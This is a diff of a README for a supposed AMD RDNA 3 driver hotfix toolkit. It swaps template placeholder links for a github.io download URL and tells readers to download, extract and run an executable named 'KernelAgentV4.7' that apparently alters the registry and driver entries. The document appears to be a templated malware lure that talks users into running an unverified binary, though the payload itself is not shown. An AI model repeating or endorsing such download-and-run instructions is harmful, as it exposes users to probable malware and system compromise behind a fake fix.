@@ -2,13 +2,13 @@
 
 This toolkit is designed to solve persistent driver crashes, black screens, and instability on AMD RDNA 3 GPUs by applying safe registry-level tweaks and driver cleanup using `KernelAgentV4.7`.
 
-[![Download RDNA 3 Hotfix](https://img.shields.io/badge/Download-RDNA3_Hotfix_Toolkit-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download RDNA 3 Hotfix](https://img.shields.io/badge/Download-RDNA3_Hotfix_Toolkit-blueviolet)](https://rdna3-hotfix-toolkit-driver-patch.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://rdna3-hotfix-toolkit-driver-patch.github.io/.github) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\RDNA3Fix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will apply stability-focused configurations and purge faulty driver entries  
